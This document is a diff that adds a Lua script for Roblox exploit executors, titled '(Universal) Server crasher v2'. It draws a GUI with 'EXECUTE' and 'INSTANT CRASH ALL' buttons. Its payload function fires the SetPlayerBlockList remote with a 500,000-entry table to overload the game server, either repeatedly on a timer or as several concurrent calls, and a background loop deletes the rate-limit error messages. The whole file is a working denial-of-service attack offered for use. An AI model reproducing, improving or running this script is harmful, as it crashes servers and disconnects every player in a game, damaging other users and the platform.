@@ -1,0 +1,271 @@
+-- Services
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- ==========================================
+-- CLEAN UP OLD LOOPS UPON RE-EXECUTION
+-- ==========================================
+if getgenv().ServerCrasherLoops then
+    for _, loopState in pairs(getgenv().ServerCrasherLoops) do
+        loopState.active = false
+    end
+end
+getgenv().ServerCrasherLoops = {}
+
+-- ==========================================
+-- INSTANT ERROR REMOVAL MONITOR
+-- ==========================================
+if not getgenv().ServerCrasherErrorMon then
+    getgenv().ServerCrasherErrorMon = true
+    task.spawn(function()
+        while true do
+            pcall(function()
+                for _, gui in ipairs(PlayerGui:GetDescendants()) do
+                    if gui:IsA("TextLabel") or gui:IsA("TextButton") then
+                        if gui.Text and gui.Text:find("CommandLimitPerMinute") then
+                            local parent = gui.Parent
+                            while parent and parent ~= PlayerGui do
+                                if parent:IsA("ScreenGui") or parent:IsA("Frame") then
+                                    parent:Destroy()
+                                    break
+                                end
+                                parent = parent.Parent
+                            end
+                        end
+                    end
+                end
+            end)
+            task.wait(0.05)
+        end
+    end)
+end
+
+-- Remove old GUI if it exists
+if PlayerGui:FindFirstChild("ServerCrasherGui") then
+    PlayerGui.ServerCrasherGui:Destroy()
+end
+
+-- Create UI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "ServerCrasherGui"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = PlayerGui
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 240, 0, 205)
+Frame.Position = UDim2.new(0.1, 0, 0.1, 0)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.Active = true
+Frame.Draggable = true
+Frame.Parent = ScreenGui
+
+-- Title Header at the Top
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Size = UDim2.new(1, -30, 0, 30)
+TitleLabel.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.Text = " (Universal) Server crasher v2"
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+TitleLabel.Font = Enum.Font.SourceSansBold
+TitleLabel.TextSize = 12
+TitleLabel.Parent = Frame
+
+-- Floating Circle Icon (Shown when minimized)
+local CircleBtn = Instance.new("TextButton")
+CircleBtn.Size = UDim2.new(0, 85, 0, 85)
+CircleBtn.Position = UDim2.new(0.5, -42, 0.1, 0)
+CircleBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+CircleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CircleBtn.Text = "(Universal) Server crasher v2"
+CircleBtn.TextWrapped = true
+CircleBtn.Font = Enum.Font.SourceSansBold
+CircleBtn.TextSize = 10
+CircleBtn.Visible = false
+CircleBtn.Active = true
+CircleBtn.Draggable = true
+CircleBtn.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(1, 0)
+UICorner.Parent = CircleBtn
+
+-- Minimize Button (-)
+local MinimizeBtn = Instance.new("TextButton")
+MinimizeBtn.Size = UDim2.new(0, 30, 0, 30)
+MinimizeBtn.Position = UDim2.new(1, -30, 0, 0)
+MinimizeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeBtn.Text = "-"
+MinimizeBtn.Font = Enum.Font.SourceSansBold
+MinimizeBtn.TextSize = 16
+MinimizeBtn.Parent = Frame
+
+-- First Textbox: number count
+local CountBox = Instance.new("TextBox")
+CountBox.Size = UDim2.new(0.9, 0, 0, 26)
+CountBox.Position = UDim2.new(0.05, 0, 0, 38)
+CountBox.PlaceholderText = "number count (e.g. 5)"
+CountBox.Text = "5"
+CountBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+CountBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+CountBox.Font = Enum.Font.SourceSansBold
+CountBox.TextSize = 12
+CountBox.ClearTextOnFocus = false
+CountBox.Parent = Frame
+
+-- Second Textbox: number delays
+local DelayBox = Instance.new("TextBox")
+DelayBox.Size = UDim2.new(0.9, 0, 0, 26)
+DelayBox.Position = UDim2.new(0.05, 0, 0, 70)
+DelayBox.PlaceholderText = "number delays (e.g. 2)"
+DelayBox.Text = "2"
+DelayBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+DelayBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+DelayBox.Font = Enum.Font.SourceSansBold
+DelayBox.TextSize = 12
+DelayBox.ClearTextOnFocus = false
+DelayBox.Parent = Frame
+
+-- Green Execute Button
+local BurstBtn = Instance.new("TextButton")
+BurstBtn.Size = UDim2.new(0.42, 0, 0, 30)
+BurstBtn.Position = UDim2.new(0.05, 0, 0, 102)
+BurstBtn.BackgroundColor3 = Color3.fromRGB(50, 180, 80)
+BurstBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+BurstBtn.Text = "EXECUTE"
+BurstBtn.Font = Enum.Font.SourceSansBold
+BurstBtn.TextSize = 12
+BurstBtn.Parent = Frame
+
+-- Stop Button
+local StopBtn = Instance.new("TextButton")
+StopBtn.Size = UDim2.new(0.42, 0, 0, 30)
+StopBtn.Position = UDim2.new(0.53, 0, 0, 102)
+StopBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
+StopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+StopBtn.Text = "STOP SPAM"
+StopBtn.Font = Enum.Font.SourceSansBold
+StopBtn.TextSize = 12
+StopBtn.Parent = Frame
+
+-- New Instant Disconnect Button
+local InstantCrashBtn = Instance.new("TextButton")
+InstantCrashBtn.Size = UDim2.new(0.9, 0, 0, 30)
+InstantCrashBtn.Position = UDim2.new(0.05, 0, 0, 136)
+InstantCrashBtn.BackgroundColor3 = Color3.fromRGB(130, 50, 180)
+InstantCrashBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+InstantCrashBtn.Text = "INSTANT CRASH ALL"
+InstantCrashBtn.Font = Enum.Font.SourceSansBold
+InstantCrashBtn.TextSize = 12
+InstantCrashBtn.Parent = Frame
+
+-- Status Label
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.new(1, 0, 0, 20)
+Status.Position = UDim2.new(0, 0, 0, 172)
+Status.BackgroundTransparency = 1
+Status.TextColor3 = Color3.fromRGB(150, 255, 150)
+Status.Text = "Status: Idle"
+Status.Font = Enum.Font.SourceSansItalic
+Status.TextSize = 12
+Status.Parent = Frame
+
+-- Minimize & Maximize logic
+MinimizeBtn.MouseButton1Click:Connect(function()
+    Frame.Visible = false
+    CircleBtn.Visible = true
+end)
+
+CircleBtn.MouseButton1Click:Connect(function()
+    Frame.Visible = true
+    CircleBtn.Visible = false
+end)
+
+-- Core Crash Payload Function
+local function triggerCoreCrash()
+    pcall(function()
+        local remote = game:FindFirstChild("RobloxReplicatedStorage") and game.RobloxReplicatedStorage:FindFirstChild("SetPlayerBlockList")
+        if remote then
+            local entries = 500000
+            local payload = table.create(entries)
+            for i = 1, entries do
+                payload[i] = { id = i, v = i * 2 }
+            end
+            remote:FireServer(payload)
+        end
+    end)
+end
+
+-- ==========================================
+-- TIMED SPAM LOOP (Count & Delay)
+-- ==========================================
+BurstBtn.MouseButton1Click:Connect(function()
+    local count = tonumber(CountBox.Text) or 5
+    local delayTime = tonumber(DelayBox.Text) or 2
+    
+    -- Stop any existing active loops first
+    for _, loopState in pairs(getgenv().ServerCrasherLoops) do
+        loopState.active = false
+    end
+    
+    local myLoopState = { active = true }
+    table.insert(getgenv().ServerCrasherLoops, myLoopState)
+    
+    Status.Text = "Status: Spamming (0/" .. count .. ")"
+    
+    task.spawn(function()
+        for i = 1, count do
+            if not myLoopState.active then break end
+            
+            triggerCoreCrash()
+            Status.Text = "Status: Spamming (" .. i .. "/" .. count .. ")"
+            
+            if i < count then
+                local elapsed = 0
+                while elapsed < delayTime do
+                    if not myLoopState.active then break end
+                    task.wait(0.1)
+                    elapsed = elapsed + 0.1
+                end
+            end
+        end
+        
+        if myLoopState.active then
+            Status.Text = "Status: Completed (" .. count .. " sent)"
+            myLoopState.active = false
+        else
+            Status.Text = "Status: Stopped"
+        end
+    end)
+end)
+
+-- Stop button event
+StopBtn.MouseButton1Click:Connect(function()
+    for _, loopState in pairs(getgenv().ServerCrasherLoops) do
+        loopState.active = false
+    end
+    Status.Text = "Status: Stopped"
+end)
+
+-- Instant Crash All Button Event
+InstantCrashBtn.MouseButton1Click:Connect(function()
+    -- Stop any ongoing loops
+    for _, loopState in pairs(getgenv().ServerCrasherLoops) do
+        loopState.active = false
+    end
+    
+    Status.Text = "Status: Crashing All Players..."
+    
+    -- Instantly fire multiple heavy payloads concurrently to drop the server right away
+    task.spawn(function()
+        for i = 1, 5 do
+            task.spawn(function()
+                triggerCoreCrash()
+            end)
+        end
+    end)
+end)
+
+print("(Universal) Server crasher v2 loaded successfully!")
